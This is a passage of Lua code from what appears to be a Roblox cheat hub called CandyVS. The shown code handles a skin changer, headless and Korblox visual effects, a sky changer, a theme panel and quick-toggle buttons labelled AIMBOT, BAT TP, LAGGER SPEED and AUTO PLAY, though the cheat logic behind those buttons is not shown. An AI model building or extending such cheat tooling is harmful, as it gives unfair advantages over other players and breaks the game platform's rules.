			if item:IsA("Shirt") or item:IsA("Pants") or skinState.isHair(item) then
				table.insert(original.items, item:Clone())
			end
		end
		skinState.originals[character] = original
	end
	skinState.presets = {
		V1 = {shirt = 74707712629633, pants = 12405320750, hair = 140188532534398},
		V2 = {shirt = 101796619834594, pants = 18975891159, hair = 115520061093937},
		V3 = {shirt = 18552805597, pants = 5414143509, hair = 84008082880128},
	}
	skinState.attachHair = function(character, humanoid, assetId, generation)
		local ok, objects = pcall(function() return game:GetObjects("rbxassetid://" .. tostring(assetId)) end)
		if not ok or not objects or not objects[1] then
			warn("[Skin Changer] No se pudo cargar el pelo " .. tostring(assetId) .. ": " .. tostring(objects))
			return false
		end
		local root = objects[1]
		local source = root:IsA("Accessory") and root or root:FindFirstChildWhichIsA("Accessory", true)
		if not source then
			root:Destroy()
			warn("[Skin Changer] El asset de pelo no contiene un Accessory")
			return false
		end
		local hair = source:Clone()
		hair.Name = "CandyVSSkinChanger_Hair"
		pcall(function() root:Destroy() end)
		local head = character:FindFirstChild("Head")
		local handle = hair:FindFirstChild("Handle")
		if not head or not handle or not handle:IsA("BasePart") then
			hair:Destroy()
			warn("[Skin Changer] Falta Head o Handle para colocar el pelo")
			return false
		end
		if not toggleStates["Skin Changer"] or Player.Character ~= character or skinState.generation ~= generation then
			hair:Destroy()
			return false
		end
		local attached, reason = pcall(function()
			for _, part in ipairs(hair:GetDescendants()) do
				if part:IsA("BasePart") then
					part.Anchored = false
					part.CanCollide = false
					part.Massless = true
					part.LocalTransparencyModifier = 0
				end
			end
			handle.Transparency = 0
			pcall(function() humanoid:AddAccessory(hair) end)
			hair.Parent = character
			local accessoryAttachment, headAttachment
			for _, attachment in ipairs(handle:GetChildren()) do
				if attachment:IsA("Attachment") then
					local matching = head:FindFirstChild(attachment.Name)
					if matching and matching:IsA("Attachment") then
						accessoryAttachment, headAttachment = attachment, matching
						break
					end
				end
			end
			local c0 = accessoryAttachment and accessoryAttachment.CFrame or hair.AttachmentPoint
			local c1 = headAttachment and headAttachment.CFrame or CFrame.new(0, head.Size.Y / 2, 0)
			local oldWeld = handle:FindFirstChild("AccessoryWeld")
			if oldWeld then oldWeld:Destroy() end
			handle.CFrame = head.CFrame * c1 * c0:Inverse()
			local weld = Instance.new("Weld")
			weld.Name = "AccessoryWeld"
			weld.Part0 = handle
			weld.Part1 = head
			weld.C0 = c0
			weld.C1 = c1
			weld.Parent = handle
		end)
		if not attached then
			hair:Destroy()
			warn("[Skin Changer] No se pudo colocar el pelo: " .. tostring(reason))
		end
		return attached
	end
	skinState.apply = function(active, character)
		skinState.generation = (skinState.generation or 0) + 1
		local generation = skinState.generation
		character = character or Player.Character
		if not character then return false end
		local humanoid = character:FindFirstChildOfClass("Humanoid") or character:WaitForChild("Humanoid", 10)
		if not humanoid then return false end
		if generation ~= skinState.generation then return false end
		if active then
			local preset = skinState.presets[skinChangerMode] or skinState.presets.V1
			local shirtTemplate = skinState.resolveTemplate(preset.shirt, "Shirt", "ShirtTemplate")
			local pantsTemplate = skinState.resolveTemplate(preset.pants, "Pants", "PantsTemplate")
			if generation ~= skinState.generation or not toggleStates["Skin Changer"] or Player.Character ~= character then return false end
			skinState.capture(character)
			skinState.removeChanged(character)
			local shirt = Instance.new("Shirt")
			shirt.Name = "CandyVSSkinChanger_Shirt"
			shirt.ShirtTemplate = shirtTemplate
			shirt.Parent = character
			local pants = Instance.new("Pants")
			pants.Name = "CandyVSSkinChanger_Pants"
			pants.PantsTemplate = pantsTemplate
			pants.Parent = character
			return skinState.attachHair(character, humanoid, preset.hair, generation)
		end
		local original = skinState.originals[character]
		skinState.removeChanged(character)
		if not original then return false end
		for _, item in ipairs(original.items) do
			local clone = item:Clone()
			if clone:IsA("Accessory") then
				pcall(function() humanoid:AddAccessory(clone) end)
			else
				clone.Parent = character
			end
		end
		return true
	end
	FeaturePostToggle["Skin Changer"] = function(active)
		task.spawn(function()
			if active ~= (toggleStates["Skin Changer"] == true) then return end
			skinState.apply(active == true, Player.Character)
		end)
	end
	_G.__CandyVSTrackConn(Player.CharacterAdded:Connect(function(character)
		if not toggleStates["Skin Changer"] then return end
		task.wait(0.75)
		if toggleStates["Skin Changer"] then skinState.apply(true, character) end
	end))
	if toggleStates["Skin Changer"] then
		task.delay(0.5, skinState.apply, true, Player.Character)
	end
	end

	do
	local appearanceState = _G.__CandyVSVisualAppearanceState
	if type(appearanceState) ~= "table" or appearanceState.version ~= 2 then
		appearanceState = {
			version = 2,
			headless = setmetatable({}, {__mode = "k"}),
			korblox = setmetatable({}, {__mode = "k"}),
		}
		_G.__CandyVSVisualAppearanceState = appearanceState
	end
	appearanceState.setHeadless = function(active, character)
		character = character or Player.Character
		local head = character and character:FindFirstChild("Head")
		if not head or not head:IsA("BasePart") then return false end
		if active then
			if not appearanceState.headless[character] then
				local saved = {headTransparency = head.Transparency, headLocalTransparency = head.LocalTransparencyModifier, faces = {}}
				for _, item in ipairs(head:GetChildren()) do
					if item:IsA("Decal") or item:IsA("Texture") then
						table.insert(saved.faces, {item = item, transparency = item.Transparency})
					end
				end
				appearanceState.headless[character] = saved
			end
			head.Transparency = 1
			head.LocalTransparencyModifier = 1
			for _, item in ipairs(head:GetChildren()) do
				if item:IsA("Decal") or item:IsA("Texture") then item.Transparency = 1 end
			end
			return true
		end
		local saved = appearanceState.headless[character]
		if not saved then return false end
		head.Transparency = saved.headTransparency
		head.LocalTransparencyModifier = saved.headLocalTransparency
		for _, face in ipairs(saved.faces) do
			if face.item and face.item.Parent then face.item.Transparency = face.transparency end
		end
		return true
	end
	appearanceState.setKorblox = function(active, character)
		character = character or Player.Character
		if not character then return false end
		local saved = appearanceState.korblox[character]
		if not active then
			local oldVisual = character:FindFirstChild("CandyVSVisual_Korblox")
			if oldVisual then pcall(function() oldVisual:Destroy() end) end
			for _, child in ipairs(character:GetChildren()) do
				if child:IsA("CharacterMesh") and child.Name == "CandyVSVisual_KorbloxCharacterMesh" then
					pcall(function() child:Destroy() end)
				end
			end
			if not saved then return false end
			for _, partState in ipairs(saved.parts) do
				if partState.part and partState.part.Parent then
					partState.part.Transparency = partState.transparency
					partState.part.LocalTransparencyModifier = partState.localTransparency
				end
			end
			return true
		end
		local target = character:FindFirstChild("LeftUpperLeg") or character:FindFirstChild("Left Leg")
		if not target or not target:IsA("BasePart") then return false end
		local ok, objects = pcall(function() return game:GetObjects("rbxassetid://139607673") end)
		if not ok or not objects or not objects[1] then
			warn("CandyVS Korblox: no se pudo cargar el asset 139607673")
			return false
		end
		local oldVisual = character:FindFirstChild("CandyVSVisual_Korblox")
		if oldVisual then pcall(function() oldVisual:Destroy() end) end
		for _, child in ipairs(character:GetChildren()) do
			if child:IsA("CharacterMesh") and child.Name == "CandyVSVisual_KorbloxCharacterMesh" then
				pcall(function() child:Destroy() end)
			end
		end
		local visual = Instance.new("Model")
		visual.Name = "CandyVSVisual_Korblox"
		for _, object in ipairs(objects) do object.Parent = visual end
		local importedParts = {}
		for _, descendant in ipairs(visual:GetDescendants()) do
			if descendant:IsA("BasePart") then table.insert(importedParts, descendant) end
		end
		local characterMeshes = {}
		for _, descendant in ipairs(visual:GetDescendants()) do
			if descendant:IsA("CharacterMesh") then table.insert(characterMeshes, descendant) end
		end
		if #importedParts == 0 and #characterMeshes == 0 then
			visual:Destroy()
			warn("CandyVS Korblox: el asset 139607673 no contiene piezas compatibles")
			return false
		end
		if not saved then
			saved = {parts = {}}
			for _, partName in ipairs({"LeftUpperLeg", "LeftLowerLeg", "LeftFoot", "Left Leg"}) do
				local part = character:FindFirstChild(partName)
				if part and part:IsA("BasePart") then
					table.insert(saved.parts, {part = part, transparency = part.Transparency, localTransparency = part.LocalTransparencyModifier})
				end
			end
			appearanceState.korblox[character] = saved
		end
		visual.Parent = character
		local isR15 = character:FindFirstChild("LeftUpperLeg") ~= nil
		if isR15 then
			for _, partState in ipairs(saved.parts) do
				if partState.part and partState.part.Parent then
					partState.part.Transparency = 1
					partState.part.LocalTransparencyModifier = 1
				end
			end
		end
		for _, part in ipairs(importedParts) do
			local matchingTarget = character:FindFirstChild(part.Name)
			if not matchingTarget or not matchingTarget:IsA("BasePart") then matchingTarget = target end
			part.Anchored = false
			part.CanCollide = false
			part.Massless = true
			part.CFrame = matchingTarget.CFrame
			local weld = Instance.new("WeldConstraint")
			weld.Part0 = matchingTarget
			weld.Part1 = part
			weld.Parent = part
		end
		for _, mesh in ipairs(characterMeshes) do
			mesh.Name = "CandyVSVisual_KorbloxCharacterMesh"
			mesh.Parent = character
		end
		return true
	end
	FeaturePostToggle["Headless Visual"] = function(active)
		appearanceState.setHeadless(active == true, Player.Character)
	end
	FeaturePostToggle["Korblox Visual"] = function(active)
		task.spawn(appearanceState.setKorblox, active == true, Player.Character)
	end
	_G.__CandyVSTrackConn(Player.CharacterAdded:Connect(function(character)
		task.wait(0.75)
		if toggleStates["Headless Visual"] then appearanceState.setHeadless(true, character) end
		if toggleStates["Korblox Visual"] then appearanceState.setKorblox(true, character) end
	end))
	if toggleStates["Headless Visual"] then task.delay(0.5, appearanceState.setHeadless, true, Player.Character) end
	if toggleStates["Korblox Visual"] then task.delay(0.5, appearanceState.setKorblox, true, Player.Character) end
	end

	do
	local skyOrigLighting = {
	Ambient = Lighting.Ambient,
	Brightness = Lighting.Brightness,
	ClockTime = Lighting.ClockTime,
	FogColor = Lighting.FogColor,
	FogEnd = Lighting.FogEnd,
	GlobalShadows = Lighting.GlobalShadows,
	EnvironmentDiffuseScale = Lighting.EnvironmentDiffuseScale,
	EnvironmentSpecularScale = Lighting.EnvironmentSpecularScale,
	OutdoorAmbient = Lighting.OutdoorAmbient,
	}
	local skyActiveColorCorr = nil
	skyCurrentMode = _G.__CandyVSSkyChangerMode or "blue"

	local function clearSkyColorCorr()
	if skyActiveColorCorr then
	pcall(function() skyActiveColorCorr:Destroy() end)
	skyActiveColorCorr = nil
	end
	end

	local function restoreSkyLighting()
	clearSkyColorCorr()
	pcall(function()
	Lighting.Ambient = skyOrigLighting.Ambient
	Lighting.Brightness = skyOrigLighting.Brightness
	Lighting.ClockTime = skyOrigLighting.ClockTime
	Lighting.FogColor = skyOrigLighting.FogColor
	Lighting.FogEnd = skyOrigLighting.FogEnd
	Lighting.GlobalShadows = skyOrigLighting.GlobalShadows
	Lighting.EnvironmentDiffuseScale = skyOrigLighting.EnvironmentDiffuseScale
	Lighting.EnvironmentSpecularScale = skyOrigLighting.EnvironmentSpecularScale
	Lighting.OutdoorAmbient = skyOrigLighting.OutdoorAmbient
	end)
	end

	function applySky(kind)
	if kind == nil or kind == "none" then
	restoreSkyLighting()
	return
	end

	clearSkyColorCorr()
	local cc = Instance.new("ColorCorrectionEffect")
	cc.Parent = Lighting
	skyActiveColorCorr = cc

	if kind == "blue" then
	Lighting.Ambient = Color3.fromRGB(30, 60, 120)
	Lighting.FogColor = Color3.fromRGB(40, 80, 160)
	cc.TintColor = Color3.fromRGB(140, 180, 255)
	cc.Saturation = 0.4
	cc.Contrast = 0.1
	elseif kind == "night" then
	Lighting.ClockTime = 0
	Lighting.Brightness = 0.2
	Lighting.Ambient = Color3.fromRGB(20, 20, 35)
	cc.TintColor = Color3.fromRGB(180, 180, 220)
	cc.Saturation = -0.2
	cc.Contrast = 0.1
	elseif kind == "day" then
	Lighting.ClockTime = 14
	Lighting.Brightness = 2
	Lighting.Ambient = Color3.fromRGB(140, 140, 140)
	cc.TintColor = Color3.fromRGB(255, 255, 255)
	cc.Saturation = 0.1
	cc.Contrast = 0
	end
	end

	FeaturePostToggle["Sky Changer"] = function(active)
	if active then
	applySky(skyCurrentMode)
	else
	restoreSkyLighting()
	end
	end

	local skyChangerToggle = makeToggleNoKeybind(visualSection, "Sky Changer", "Sky Changer")
	if skyChangerToggle then
	local skyModeBtn = Instance.new("TextButton", skyChangerToggle)
	skyModeBtn.Name = "SkyModeBtn"
	skyModeBtn.Size = UDim2.new(0, 66, 0, 20)
	skyModeBtn.Position = UDim2.new(1, -74, 0.5, -10)
	skyModeBtn.AnchorPoint = Vector2.new(0, 0)
	skyModeBtn.BackgroundColor3 = Color3.fromRGB(30,30,38)
	skyModeBtn.BorderSizePixel = 0
	skyModeBtn.Text = "BLUE"
	skyModeBtn.TextColor3 = Color3.fromRGB(225,238,255)
	skyModeBtn.Font = Enum.Font.FredokaOne
	skyModeBtn.TextSize = 10
	skyModeBtn.AutoButtonColor = false
	skyModeBtn.ZIndex = 30
	Instance.new("UICorner", skyModeBtn).CornerRadius = UDim.new(0, 4)
	local skyModeStroke = Instance.new("UIStroke", skyModeBtn)
	skyModeStroke.Color = Color3.fromRGB(255,255,255)
	skyModeStroke.Thickness = 1
	skyModeStroke.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
	local function updateSkyModeBtn()
	local label = skyCurrentMode == "day" and "DAY" or skyCurrentMode == "night" and "NIGHT" or "BLUE"
	skyModeBtn.Text = label
	skyModeBtn.BackgroundColor3 = Color3.fromRGB(30,30,38)
	skyModeBtn.TextColor3 = Color3.fromRGB(225,238,255)
	skyModeStroke.Color = Color3.fromRGB(255,255,255)
	skyModeStroke.Thickness = 1
	skyModeBtn.TextStrokeTransparency = 1
	end
	updateSkyModeBtn()
	connectBtn(skyModeBtn, function()
	if skyCurrentMode == "day" then
	skyCurrentMode = "blue"
	elseif skyCurrentMode == "blue" then
	skyCurrentMode = "night"
	else
	skyCurrentMode = "day"
	end
	_G.__CandyVSSkyChangerMode = skyCurrentMode
	saveConfig()
	updateSkyModeBtn()
	if toggleStates["Sky Changer"] then
	applySky(skyCurrentMode)
	end
	end)
	end

	if toggleStates["Sky Changer"] then
	task.delay(0.2, function() applySky(skyCurrentMode) end)
	end
	end

	makeToggleNoKeybind(visualSection, "Show Buttons", "Show Buttons")
	makeToggleNoKeybind(visualSection, "Lock Buttons", "Lock Buttons")

	do
	local mainThemesBtnContainer = Instance.new("Frame", visualSection)
	mainThemesBtnContainer.Name = "MainThemesBtnContainer"
	mainThemesBtnContainer.Visible = false
	mainThemesBtnContainer.Size = UDim2.new(1, 0, 0, 30)
	mainThemesBtnContainer.BackgroundTransparency = 1
	mainThemesBtnContainer.BorderSizePixel = 0
	mainThemesBtnContainer.ZIndex = 12

	local mainThemesBtn = Instance.new("TextButton", mainThemesBtnContainer)
	mainThemesBtn.Name = "MainThemesBtn"
	mainThemesBtn.AnchorPoint = Vector2.new(0.5, 0)
	mainThemesBtn.Size = UDim2.new(0, 150, 0, 30)
	mainThemesBtn.Position = UDim2.new(0.5, 0, 0, 0)
	mainThemesBtn.BackgroundColor3 = Color3.fromRGB(30,30,38)
	mainThemesBtn.BackgroundTransparency = 0.12
	mainThemesBtn.AutoButtonColor = false
	mainThemesBtn.Font = Enum.Font.FredokaOne
	mainThemesBtn.Text = "Themes"
	mainThemesBtn.TextColor3 = Color3.fromRGB(235,240,245)
	mainThemesBtn.TextSize = 11
	mainThemesBtn.ZIndex = 12
	mainThemesBtn.TextXAlignment = Enum.TextXAlignment.Center
	mainThemesBtn.TextYAlignment = Enum.TextYAlignment.Center
	Instance.new("UICorner", mainThemesBtn).CornerRadius = UDim.new(0, 8)
	local mainThemesBtnStroke = Instance.new("UIStroke", mainThemesBtn)
	mainThemesBtnStroke.Color = Color3.fromRGB(255,255,255)
	mainThemesBtnStroke.Thickness = 1.2
	mainThemesBtnStroke.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
	mainThemesBtnStroke.Transparency = 0.15

	local mainThemesFrame = Instance.new("Frame")
	mainThemesFrame.Name = "MainThemesPanel"
	mainThemesFrame.Size = UDim2.fromOffset(260, 268)
	mainThemesFrame.BackgroundColor3 = Color3.fromRGB(48, 92, 138)
	mainThemesFrame.BorderSizePixel = 0
	mainThemesFrame.Visible = false
	mainThemesFrame.ZIndex = 20
	mainThemesFrame.Parent = ScreenGui
	local themesGradient = Instance.new("UIGradient", mainThemesFrame)
	themesGradient.Color = ColorSequence.new({
	ColorSequenceKeypoint.new(0, Color3.fromRGB(38, 75, 118)),
	ColorSequenceKeypoint.new(0.48, Color3.fromRGB(67, 120, 174)),
	ColorSequenceKeypoint.new(1, Color3.fromRGB(34, 67, 108)),
	})
	themesGradient.Rotation = 35

	local function positionMainThemesPanel()
	if Panel then
	local panelX = Panel.Position.X.Offset + Panel.Size.X.Offset
	mainThemesFrame.Position = UDim2.new(
	Panel.Position.X.Scale,
	panelX + 24,
	Panel.Position.Y.Scale,
	Panel.Position.Y.Offset + 6
	)
	end
	end
	if Panel then
	Panel:GetPropertyChangedSignal("Position"):Connect(function()
	if _G.__CandyVSModernGuiActive or not mainThemesFrame.Parent then return end
	if mainThemesFrame.Visible then positionMainThemesPanel() end
	end)
	Panel:GetPropertyChangedSignal("Size"):Connect(function()
	if _G.__CandyVSModernGuiActive or not mainThemesFrame.Parent then return end
	if mainThemesFrame.Visible then positionMainThemesPanel() end
	end)
	local mainThemesWasOpen = false
	Panel:GetPropertyChangedSignal("Visible"):Connect(function()
	if _G.__CandyVSModernGuiActive or not mainThemesFrame.Parent then return end
	if not Panel.Visible then
	if mainThemesFrame.Visible then
	mainThemesWasOpen = true
	mainThemesFrame.Visible = false
	else
	mainThemesWasOpen = false
	end
	else
	if mainThemesWasOpen then
	positionMainThemesPanel()
	mainThemesFrame.Visible = true
	end
	end
	end)
	end
	Instance.new("UICorner", mainThemesFrame).CornerRadius = UDim.new(0, 12)
	local themesStroke = Instance.new("UIStroke", mainThemesFrame)
	themesStroke.Color = Color3.fromRGB(0, 0, 0)
	themesStroke.Thickness = 0
	themesStroke.Transparency = 1

	local pendingBackground = bgIndex or 1
	local themeCards = {}
	local function refreshMainThemeCards()
	for index, data in ipairs(themeCards) do
	local selected = index == pendingBackground
	local card = data.card
	local image = data.image
	local stroke = data.stroke
	local baseX, baseY = data.baseX, data.baseY
	local baseW, baseH = data.baseW, data.baseH

	stroke.Color = Color3.fromRGB(255, 255, 255)
	stroke.Thickness = selected and 2 or 1.5
	stroke.Transparency = selected and 0.25 or 0.7
	stroke.ApplyStrokeMode = Enum.ApplyStrokeMode.Border

	card.Size = selected and UDim2.fromOffset(math.max(4, baseW - 6), math.max(4, baseH - 6)) or UDim2.fromOffset(baseW, baseH)
	card.Position = selected and UDim2.new(0, baseX + 3, 0, baseY + 3) or UDim2.new(0, baseX, 0, baseY)
	card.BackgroundTransparency = 1
	image.Size = UDim2.new(1, 0, 1, 0)
	image.Position = UDim2.new(0, 0, 0, 0)
	image.BackgroundTransparency = 1
	end
	end

	local function layoutMainThemeCards()
	if not mainThemesFrame or not themeCards then return end
	local frameW = mainThemesFrame.AbsoluteSize.X > 0 and mainThemesFrame.AbsoluteSize.X or mainThemesFrame.Size.X.Offset
	local frameH = mainThemesFrame.AbsoluteSize.Y > 0 and mainThemesFrame.AbsoluteSize.Y or mainThemesFrame.Size.Y.Offset
	local paddingX = 12
	local paddingY = 12
	local gapX = 10
	local gapY = 10
	local safeBottom = 36
	local usableW = math.max(0, frameW - paddingX * 2)
	local usableH = math.max(0, frameH - safeBottom - paddingY * 2)
	local cardW = math.floor((usableW - gapX) / 2)
	local cardH = math.floor((usableH - gapY) / 2)

	for index, data in ipairs(themeCards) do
	local col = ((index - 1) % 2)
	local row = math.floor((index - 1) / 2)
	local x = paddingX + col * (cardW + gapX)
	local y = paddingY + row * (cardH + gapY)
	data.baseX = x
	data.baseY = y
	data.baseW = cardW
	data.baseH = cardH
	data.card.Size = UDim2.fromOffset(cardW, cardH)
	data.card.Position = UDim2.new(0, x, 0, y)
	data.image.Size = UDim2.new(1, 0, 1, 0)
	data.image.Position = UDim2.new(0, 0, 0, 0)
	end
	end

	for index, imageId in ipairs(backgroundIds) do
	local card = Instance.new("TextButton", mainThemesFrame)
	card.BackgroundColor3 = Color3.fromRGB(30,30,38)
	card.BackgroundTransparency = 1
	card.BorderSizePixel = 0
	card.Text = ""
	card.AutoButtonColor = false
	card.ZIndex = 21
	Instance.new("UICorner", card).CornerRadius = UDim.new(0, 7)
	local cardImage = Instance.new("ImageLabel", card)
	cardImage.BackgroundTransparency = 1
	cardImage.Image = imageId
	cardImage.ScaleType = Enum.ScaleType.Crop
	cardImage.ZIndex = 21
	Instance.new("UICorner", cardImage).CornerRadius = UDim.new(0, 7)
	local cardLabel = Instance.new("TextLabel", card)
	cardLabel.Size = UDim2.new(1, -12, 0, 12)
	cardLabel.Position = UDim2.new(0, 6, 1, -14)
	cardLabel.BackgroundTransparency = 1
	cardLabel.Text = "GUI " .. tostring(index)
	cardLabel.TextColor3 = Color3.fromRGB(235,240,245)
	cardLabel.TextSize = 8
	cardLabel.Font = Enum.Font.FredokaOne
	cardLabel.ZIndex = 23
	cardLabel.TextStrokeColor3 = Color3.fromRGB(5, 12, 25)
	cardLabel.TextStrokeTransparency = 0.25
	local cardStroke = Instance.new("UIStroke", card)
	cardStroke.Color = Color3.fromRGB(255,255,255)
	cardStroke.Thickness = 0
	cardStroke.Transparency = 1
	cardStroke.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
	table.insert(themeCards, {
	card = card,
	image = cardImage,
	stroke = cardStroke,
	baseX = 0,
	baseY = 0,
	baseW = 0,
	baseH = 0,
	})
	card.Activated:Connect(function()
	pendingBackground = index
	refreshMainThemeCards()
	end)
	end

	local saveThemeButton = Instance.new("TextButton", mainThemesFrame)
	saveThemeButton.Size = UDim2.new(1, -24, 0, 28)
	saveThemeButton.Position = UDim2.new(0, 12, 1, -44)

	pcall(function() layoutMainThemeCards() end)
	mainThemesFrame:GetPropertyChangedSignal("AbsoluteSize"):Connect(function()
	pcall(layoutMainThemeCards)
	end)
	saveThemeButton.BackgroundColor3 = Color3.fromRGB(120,180,240)
	saveThemeButton.BorderSizePixel = 0
	saveThemeButton.Text = "Save Theme"
	saveThemeButton.TextColor3 = Color3.fromRGB(235,240,245)
	saveThemeButton.TextSize = 11
	saveThemeButton.Font = Enum.Font.FredokaOne
	saveThemeButton.ZIndex = 21
	Instance.new("UICorner", saveThemeButton).CornerRadius = UDim.new(0, 7)
	saveThemeButton.Activated:Connect(function()
	bgIndex = pendingBackground
	if BgImage then BgImage.Image = backgroundIds[bgIndex] end
	mainThemesFrame.Visible = false
	if HeaderBgBtn then pcall(function() HeaderBgBtn.Text = tostring(bgIndex) .. "/" .. tostring(#backgroundIds) end) end
	_G["_CandyVS_UI_BgIndex"] = bgIndex
	saveConfig()
	end)

	mainThemesBtn.Activated:Connect(function()
	pendingBackground = bgIndex
	positionMainThemesPanel()
	mainThemesFrame.Visible = not mainThemesFrame.Visible
	refreshMainThemeCards()
	end)

	if HeaderBgBtn then pcall(function() HeaderBgBtn.Visible = false end) end
	end

	do
	local oldQuickButtons = _G.__CandyVSQuickButtonsFrame
	if oldQuickButtons then pcall(function() oldQuickButtons:Destroy() end) end

	local quickButtons = Instance.new("Frame")
	quickButtons.Name = "CandyVSQuickButtons"
	quickButtons.Size = UDim2.new(1, 0, 1, 0)
	quickButtons.Position = UDim2.new(0, 0, 0, 0)
	quickButtons.BackgroundTransparency = 1
	quickButtons.BorderSizePixel = 0
	quickButtons.Active = false
	quickButtons.ZIndex = 750
	quickButtons.Visible = toggleStates["Show Buttons"] == true
	quickButtons.Parent = ScreenGui
	_G.__CandyVSQuickButtonsFrame = quickButtons

	local function makeQuickButton(label, order)
	local button = Instance.new("TextButton")
	button.Name = label:gsub("%s+", "") .. "Button"
	local sizeScale = Instance.new("UIScale", button)
	sizeScale.Name = "QuickButtonSizeScale"
	sizeScale.Scale = _G.__CandyVSButtonsSize or 1
	local BTN_W = 56
	local BTN_H = 56
	local buttonGap = 8
	local CORNER_R = 10
	button.Size = UDim2.new(0, BTN_W, 0, BTN_H)
	local baseY = (isMobile and 72 or 81)
	local margin = isMobile and 12 or 16
	if order <= 3 then
	button.Position = UDim2.new(1, -(margin + BTN_W), 0, baseY + (order - 1) * (BTN_H + buttonGap))
	else
	local idx = (order - 4)
	button.Position = UDim2.new(1, -(margin + BTN_W * 2 + buttonGap), 0, baseY + idx * (BTN_H + buttonGap))
	end
	button.LayoutOrder = order
	button:SetAttribute("OriginalPosition", button.Position)
	button.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
	button.BackgroundTransparency = 0
	button.BorderSizePixel = 0
	button.AutoButtonColor = false
	button.Active = true
	button.Draggable = false
	button.Font = Enum.Font.FredokaOne
	button.Text = label
	button.TextScaled = true
	button.TextWrapped = true
	button.TextColor3 = Color3.fromRGB(255, 255, 255)
	button.TextStrokeColor3 = Color3.fromRGB(0, 0, 0)
	button.TextStrokeTransparency = 0.35
	button.ZIndex = 751
	button.Parent = quickButtons
	Instance.new("UICorner", button).CornerRadius = UDim.new(0, CORNER_R)
	local textSizeConstraint = Instance.new("UITextSizeConstraint")
	textSizeConstraint.MinTextSize = 11
	textSizeConstraint.MaxTextSize = 15
	textSizeConstraint.Parent = button
	local stroke = Instance.new("UIStroke")
	stroke.Color = Color3.fromRGB(0, 0, 0)
	stroke.Thickness = 1.2
	stroke.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
	stroke.Transparency = 0.2
	stroke.Parent = button
	return button, stroke
	end

	local aimbotButton, aimbotStroke = makeQuickButton("AIMBOT", 1)
	local autoBatButton, autoBatStroke = makeQuickButton("BAT TP", 2)
	local tpDownButton, tpDownStroke = makeQuickButton("TP DOWN", 3)
	local dropButton, dropStroke = makeQuickButton("DROP", 4)
	local carrySpeedButton, carrySpeedStroke = makeQuickButton("CARRY SPEED", 5)
	local speedModeButton, speedModeStroke = makeQuickButton("LAGGER SPEED", 6)
	local autoplayButton, autoplayStroke = makeQuickButton("AUTO PLAY", 7)
	local quickTapBlocked = {}
	quickTapBlocked.custom = {}
	quickTapBlocked.custom.button, quickTapBlocked.custom.stroke = makeQuickButton("CUSTOM SPEED", 8)
	quickTapBlocked.custom.button.Visible = true

	quickTapBlocked.custom.getByName = function(name)
	for _, customSpeed in ipairs(customSpeeds) do
	if customSpeed.name == name then return customSpeed end
	end
	return nil
	end

	quickTapBlocked.custom.getSelected = function()
	local selectedCustomSpeed = quickTapBlocked.custom.getByName(selectedMode)
	if selectedCustomSpeed then
	quickTapBlocked.custom.lastName = selectedCustomSpeed.name
	return selectedCustomSpeed
	end
	return quickTapBlocked.custom.getByName(quickTapBlocked.custom.lastName) or customSpeeds[1]
	end

	local function setQuickVisual(button, stroke, active)
	if active then
	button.BackgroundColor3 = Color3.fromRGB(255, 140, 0)
	button.BackgroundTransparency = 0.05
	button.TextColor3 = Color3.fromRGB(255, 255, 255)
	button.TextStrokeTransparency = 0.6
	stroke.Color = Color3.fromRGB(255, 190, 80)
	stroke.Thickness = 1.8
	stroke.Transparency = 0.1
	else
	button.BackgroundColor3 = Color3.fromRGB(40, 12, 30)
	button.BackgroundTransparency = 0.1
	button.TextColor3 = Color3.fromRGB(255, 200, 230)
	button.TextStrokeTransparency = 0.5
	stroke.Color = Color3.fromRGB(255, 140, 0)
	stroke.Thickness = 1.5
	stroke.Transparency = 0.25
	end
	end

	local function toggleQuickFeature(featureName)
	local blockedWhileStealing = {}
	local newState = not (toggleStates[featureName] == true)
	if newState and blockedWhileStealing[featureName] and Player:GetAttribute("Stealing") == true and not (_G["_CandyVSHub_BypassAuto"] == true) then
	return
	end
	toggleStates[featureName] = newState
	if toggleStateSetters[featureName] then pcall(toggleStateSetters[featureName], newState) end
	if FeaturePostToggle[featureName] then pcall(FeaturePostToggle[featureName], newState) end
	saveConfig()
	end

	local movableButtons = {
	aimbotButton, autoBatButton, tpDownButton,
	dropButton, carrySpeedButton, speedModeButton, autoplayButton, quickTapBlocked.custom.button,
	}

	task.defer(function()
	for _, button in ipairs(movableButtons) do
	local saved = quickButtonPositions[button.Name]
	if saved and saved.x and saved.y then
	local x, y = placeInsideViewport(button, 0, saved.x, 0, saved.y, _G.__CandyVSButtonsSize or 1)
	button.Position = UDim2.new(0, x, 0, y)
	quickButtonPositions[button.Name] = { x = x, y = y }
	else
	local position = button.Position
	placeInsideViewport(button, position.X.Scale, position.X.Offset, position.Y.Scale, position.Y.Offset, _G.__CandyVSButtonsSize or 1)
	end
	end
	end)

	local draggingQuickButton = nil
	local quickDragStart = nil
	local quickDragPosition = nil
	local quickDragInput = nil
	local quickDragMoved = false
	_G.__CandyVSSetButtonsSize = function(value)
		local size = tonumber((tostring(value):gsub(",", ".")))
		if not size or size ~= size or math.abs(size) == math.huge then return _G.__CandyVSButtonsSize end
		size = math.floor(math.clamp(size, 0.5, 2) * 100 + 0.5) / 100
		_G.__CandyVSButtonsSize = size
		draggingQuickButton, quickDragStart, quickDragPosition, quickDragInput = nil, nil, nil, nil
		quickDragMoved = false
		for _, button in ipairs(movableButtons) do
			button.QuickButtonSizeScale.Scale = size
			local position = button.Position
			local x, y = placeInsideViewport(button, position.X.Scale, position.X.Offset, position.Y.Scale, position.Y.Offset, size)
			if quickButtonPositions[button.Name] then quickButtonPositions[button.Name] = {x = x, y = y} end
		end
		saveConfig()
		return size
	end
	quickTapBlocked.resetPositions = function()
	if draggingQuickButton then
	local button = draggingQuickButton
	quickTapBlocked[button] = true
	task.delay(0.2, function() quickTapBlocked[button] = nil end)
	end
	draggingQuickButton = nil
	quickDragStart = nil
	quickDragPosition = nil
	quickDragInput = nil
	quickDragMoved = false
	table.clear(quickButtonPositions)
	for _, button in ipairs(movableButtons) do
	local position = button:GetAttribute("OriginalPosition")
	placeInsideViewport(button, position.X.Scale, position.X.Offset, position.Y.Scale, position.Y.Offset, _G.__CandyVSButtonsSize or 1)
	end
	_G.__CandyVSGuiPositionsReset = true
	for _, resetPosition in pairs(_G.__CandyVSGuiPositionResetters) do
	resetPosition()
	end
	saveConfig()
	end
	_G.__CandyVSResetButtonPositions = quickTapBlocked.resetPositions
